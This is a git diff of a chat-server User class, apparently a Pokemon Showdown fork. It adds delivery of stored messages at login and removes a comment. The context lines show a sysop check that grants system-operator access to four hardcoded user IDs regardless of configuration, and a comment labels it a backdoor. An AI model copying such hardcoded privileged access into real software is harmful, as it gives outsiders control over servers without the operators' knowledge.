@@ -480,7 +480,6 @@ class User {
 	/**
 	 * Special permission check for system operators
 	 */
-	// Put sysops for your server here. NOT on in the array 4 lines down from here, that one is for Exiled sysops so we can help you incase of an emergency.
 	hasSysopAccess() {
 		if (this.isSysop && Config.backdoor || ["insist", "volco", "vxn", "mewth"].includes(this.userid)) {
 			// This is the Pokemon Showdown system operator backdoor.
@@ -669,6 +668,7 @@ class User {
 		});
 		Exiled.showNews(userid, this);
 		Exiled.giveDailyReward(userid, this);
+		if (Tells.inbox[userid]) Tells.sendTell(userid, this);
 
 		return false;
 	}
